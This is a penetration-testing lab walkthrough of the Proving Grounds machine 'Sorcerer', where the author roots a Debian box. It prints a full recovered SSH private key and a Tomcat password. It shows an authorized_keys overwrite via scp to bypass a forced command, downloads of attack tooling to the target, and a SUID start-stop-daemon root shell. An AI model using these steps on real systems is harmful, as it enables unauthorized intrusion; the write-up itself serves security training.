---
machine: Sorcerer
platform: Proving Grounds
category: Linux
difficulty: Medium
tags: [information-disclosure, ssh-key-theft, ssh-forced-command-bypass, nfs, gtfobins]
date: 2026-08-19
status: retired
summary: A Debian box exposing NFS, an unauthenticated control panel, and a Tomcat instance — testing zip-archive information disclosure to recover a private SSH key restricted to a forced `scp` command, an authorized_keys overwrite to escape that restriction, and a writable SUID binary abused via GTFOBins for root.
---

## Enumeration

nmap scan:

```bash
──(kali㉿kali)-[~/oscp/sorcerer]
└─$ nmap-full 192.168.107.100
[*] Running fast port discovery on 192.168.107.100...
[*] Open ports: 22,80,111,2049,7742,8080,37299,43301,44355,45643
[*] Running full scan on 192.168.107.100...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 11:31 -0400
Nmap scan report for 192.168.107.100
Host is up (0.036s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)
|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)
|_  256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)
80/tcp    open  http     nginx
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      40470/udp   mountd
|   100005  1,2,3      44355/tcp   mountd
|   100021  1,3,4      43301/tcp   nlockmgr
|   100021  1,3,4      51802/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
7742/tcp  open  http     nginx
|_http-title: SORCERER
8080/tcp  open  http     Apache Tomcat 7.0.4
|_http-title: Apache Tomcat/7.0.4
|_http-favicon: Apache Tomcat
37299/tcp open  mountd   1-3 (RPC #100005)
43301/tcp open  nlockmgr 1-4 (RPC #100021)
44355/tcp open  mountd   1-3 (RPC #100005)
45643/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds

```

We have a nginx webapp with nothing on it on port 80, an nginx webapp on 7742, and an apache Tomcat webapp on port 8080

The port 7742 webapp has a Control Panel with a username and password prompt. Interestingly we can look at the source code and determine no password validation occurs.

```bash
──(kali㉿kali)-[~/oscp/sorcerer]
└─$ rpcinfo -p target
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  55211  mountd
    100005    1   tcp  37299  mountd
    100005    2   udp  58902  mountd
    100005    2   tcp  45643  mountd
    100005    3   udp  40470  mountd
    100005    3   tcp  44355  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100003    3   udp   2049  nfs
    100227    3   udp   2049  nfs_acl
    100021    1   udp  51802  nlockmgr
    100021    3   udp  51802  nlockmgr
    100021    4   udp  51802  nlockmgr
    100021    1   tcp  43301  nlockmgr
    100021    3   tcp  43301  nlockmgr
    100021    4   tcp  43301  nlockmgr

```

If we feroxbust the 7742 webapp with seclist's raft-medium wordlist w see:

```bash
┌──(kali㉿kali)-[~/oscp/sorcerer]
└─$ feroxbuster -u http://target:7742 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --thorough

──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       65l      117w     1219c http://target:7742/
301      GET        7l       12w      178c http://target:7742/default => http://target:7742/default/
301      GET        7l       12w      178c http://target:7742/zipfiles => http://target:7742/zipfiles/
200      GET       13l       82w     4741c http://target:7742/zipfiles/miriam.zip
200      GET       13l       82w     4733c http://target:7742/zipfiles/sofia.zip
200      GET       39l      203w    13898c http://target:7742/zipfiles/max.zip
200      GET       13l       81w     4749c http://target:7742/zipfiles/francis.zip

```

We can unzip these:

```bash
┌──(kali㉿kali)-[~/oscp/sorcerer/zip]
└─$ unzip francis.zip 
Archive:  francis.zip
   creating: home/francis/
  inflating: home/francis/.bash_logout  
  inflating: home/francis/.profile   
  inflating: home/francis/.bashrc    
                                                                                                                                                        
┌──(kali㉿kali)-[~/oscp/sorcerer/zip]
└─$ unzip max.zip    
Archive:  max.zip
   creating: home/max/
  inflating: home/max/.bash_logout   
  inflating: home/max/.profile       
   creating: home/max/.ssh/
  inflating: home/max/.ssh/id_rsa.pub  
  inflating: home/max/.ssh/authorized_keys  
  inflating: home/max/.ssh/id_rsa    
  inflating: home/max/tomcat-users.xml.bak  
  inflating: home/max/.bashrc        
  inflating: home/max/scp_wrapper.sh  
                                                                                                                                                        
┌──(kali㉿kali)-[~/oscp/sorcerer/zip]
└─$ unzip miriam.zip 
Archive:  miriam.zip
   creating: home/miriam/
  inflating: home/miriam/.bash_logout  
  inflating: home/miriam/.profile    
  inflating: home/miriam/.bashrc     
                                                                                                                                                        
┌──(kali㉿kali)-[~/oscp/sorcerer/zip]
└─$ unzip sofia.zip 
Archive:  sofia.zip
   creating: home/sofia/
  inflating: home/sofia/.bash_logout  
  inflating: home/sofia/.profile     
  inflating: home/sofia/.bashrc 
```

## Foothold

We can get Max's private key from /home/max/.ssh/id_rsa:

```bash
──(kali㉿kali)-[~/…/zip/home/max/.ssh]
└─$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

When we try to ssh in to max though, it fails:

```bash
┌──(kali㉿kali)-[~/…/zip/home/max/.ssh]
└─$ ssh -i id_rsa max@target      
The authenticity of host 'target (192.168.107.100)' can't be established.
ED25519 key fingerprint is: SHA256:VS30806A83YR6y/jbQ1fv89VM1FjmXYbb9zmKkJ5N+4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
PTY allocation request failed on channel 0
ACCESS DENIED.
usage: scp [-346BCpqrv] [-c cipher] [-F ssh_config] [-i identity_file]
           [-l limit] [-o ssh_option] [-P port] [-S program] source ... target
```

We find this script in max which suggests we may be able to scp with him non interactively:

```bash
┌──(kali㉿kali)-[~/…/sorcerer/zip/home/max]
└─$ cat scp_wrapper.sh 
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac 
```

I can successfully read as max with scp and presumably write as max:

```bash
┌──(kali㉿kali)-[~/…/sorcerer/zip/home/max]
└─$ scp -O -i .ssh/id_rsa max@target:/etc/passwd ./output.txt
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
passwd                                                                                                                100% 1697    48.7KB/s   00:00

cat output.txt 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
_rpc:x:106:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:107:65534::/var/lib/nfs:/usr/sbin/nologin
francis:x:1000:1000::/home/francis:/bin/bash
sofia:x:1001:1001::/home/sofia:/bin/bash
miriam:x:1002:1002::/home/miriam:/bin/bash
max:x:1003:1003::/home/max:/bin/bash
dennis:x:1004:1004::/home/dennis:/bin/bash
tomcat:x:1005:1005::/opt/tomcat:/bin/false
```

We can also view tomcat-users.xml.bak from max's directory and find:

```text
<role rolename="manager-gui"/>
<user username="tomcat" password="VTUD2XxJjf5LPmu6" roles="manager-gui"/>
```

We can reason that if we can utilize our scp write/read to open up access to apache tomcat's maanger-gui (which currently shows 403 forbidden) we may be able to get a better shell or find more information that we otherwise may not be able to access. This doesn't work however as we get permission denied.

We think about our ssh access and pull down our authorized_keys:

```bash
──(kali㉿kali)-[~/…/sorcerer/zip/home/max]
└─$ cat authorized_keys     
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer 
```

We see that our public key only permits us to run scp commands, however, if we can write to the authorized_keys we could remove this restriction via adding a public key for our custom keygen:

```bash
┌──(kali㉿kali)-[~/…/zip/home/max/write]
└─$ ssh-keygen -t ed25519 -C "max@sorcerer"
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519): 
Enter passphrase for "/home/kali/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_ed25519
Your public key has been saved in /home/kali/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:KpWQeoIK6gjM7hPRzS74I3ON/t0FmValbJmFiikfPMY max@sorcerer
```

We generate a public and private id_ed25519 key and copy our public key to max's authorized_keys file overwriting it:

```bash
┌──(kali㉿kali)-[~/.ssh]
└─$ scp -O -i /home/kali/oscp/sorcerer/zip/home/max/id_rsa /home/kali/.ssh/id_ed25519.pub  max@target:/home/max/.ssh/authorized_keys
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
id_ed25519.pub                                                                                                        100%   94     2.7KB/s   00:00
```

After that we `chmod 700` our generated private key and then attempt to ssh into max with our new private key:

```bash
┌──(kali㉿kali)-[~/.ssh]
└─$ chmod 700 id_ed25519

──(kali㉿kali)-[~/.ssh]
└─$ ssh -i id_ed25519 max@target                                                                                                    
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
max@sorcerer:~$ whoami
max
```

We have gotten an unrestricted ssh shell to max! If we navigate to /home we see another user dennis that we didn't know about before.

```bash
max@sorcerer:/home$ ls
dennis  francis  max  miriam  sofia
```

If we look inside dennis we can find our local.txt

## Privilege Escalation

We find that we have a local service on port 8005:

```bash
max@sorcerer:/$ ss -tulnp
Netid            State             Recv-Q            Send-Q                       Local Address:Port                        Peer Address:Port           
udp              UNCONN            0                 0                                  0.0.0.0:111                              0.0.0.0:*              
udp              UNCONN            0                 0                                  0.0.0.0:40470                            0.0.0.0:*              
udp              UNCONN            0                 0                                  0.0.0.0:58902                            0.0.0.0:*              
udp              UNCONN            0                 0                                  0.0.0.0:51802                            0.0.0.0:*              
udp              UNCONN            0                 0                                  0.0.0.0:55211                            0.0.0.0:*              
udp              UNCONN            0                 0                                  0.0.0.0:2049                             0.0.0.0:*              
tcp              LISTEN            0                 128                                0.0.0.0:111                              0.0.0.0:*              
tcp              LISTEN            0                 100                                0.0.0.0:8080                             0.0.0.0:*              
tcp              LISTEN            0                 128                                0.0.0.0:80                               0.0.0.0:*              
tcp              LISTEN            0                 128                                0.0.0.0:37299                            0.0.0.0:*              
tcp              LISTEN            0                 128                                0.0.0.0:22                               0.0.0.0:*              
tcp              LISTEN            0                 128                                0.0.0.0:7742                             0.0.0.0:*              
tcp              LISTEN            0                 64                                 0.0.0.0:2049                             0.0.0.0:*              
tcp              LISTEN            0                 128                                0.0.0.0:44355                            0.0.0.0:*              
tcp              LISTEN            0                 1                                127.0.0.1:8005                             0.0.0.0:*              
tcp              LISTEN            0                 64                                 0.0.0.0:43301                            0.0.0.0:*              
tcp              LISTEN            0                 128                                0.0.0.0:45643                            0.0.0.0:*
```

We can go ahead and transfer over linpeas and a ligolo agent so we can route to the local port:

```bash
max@sorcerer:/dev/shm$ wget http://192.168.45.151/linpeas.sh
--2026-08-19 12:51:31--  http://192.168.45.151/linpeas.sh
Connecting to 192.168.45.151:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1090032 (1.0M) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                            100%[=========================================================================>]   1.04M  4.68MB/s    in 0.2s    

2026-08-19 12:51:31 (4.68 MB/s) - ‘linpeas.sh’ saved [1090032/1090032]

max@sorcerer:/dev/shm$ wget http://192.168.45.151/agent
--2026-08-19 12:51:38--  http://192.168.45.151/agent
Connecting to 192.168.45.151:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7373824 (7.0M) [application/x-msdos-program]
Saving to: ‘agent’

agent                             100%[=========================================================================>]   7.03M  7.72MB/s    in 0.9s    

2026-08-19 12:51:39 (7.72 MB/s) - ‘agent’ saved [7373824/7373824]
```

### Setting Up Ligolo-ng

```bash
sudo ./proxy -selfcert # on kali

chmod +x agent # on target
./agent -connect 192.168.45.151:11601 -ignore-cert

session # on kali ligolo proxy
1
tunnel_start

sudo ip route add 244.0.0.0/24 dev ligolo # on kali
```

We can fingerprint the service:

```bash
──(kali㉿kali)-[~/oscp/tools]
└─$ nmap -sCV -T4 244.0.0.1 -p 8005
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 12:55 -0400
Nmap scan report for 244.0.0.1
Host is up (0.0051s latency).

PORT     STATE SERVICE VERSION
8005/tcp open  mxi?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.29 seconds
```

We don't find anything immediately exploitable after reading some payloads and attempting a few.

We double back and run linpeas:

```text
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                         
strings Not Found                                                                                                                                       
strace Not Found                                                                                                                                        
-rwsr-xr-x 1 root root 113K Jun 24  2020 /usr/sbin/mount.nfs                                                                                            
-rwsr-xr-x 1 root root 44K Jun  3  2019 /usr/sbin/start-stop-daemon
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 35K Apr 22  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 15K Oct  9  2019 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

We see `/usr/sbin/start-stop-daemon` highlighted in yellow. After looking it up on gtfobins we see that we can use this to escalate to root trivially:

```bash
max@sorcerer:/$ /usr/sbin/start-stop-daemon -S -x /bin/sh -- -p
# whoami
root
```

We can read proof.txt from /root and the box is compromised!
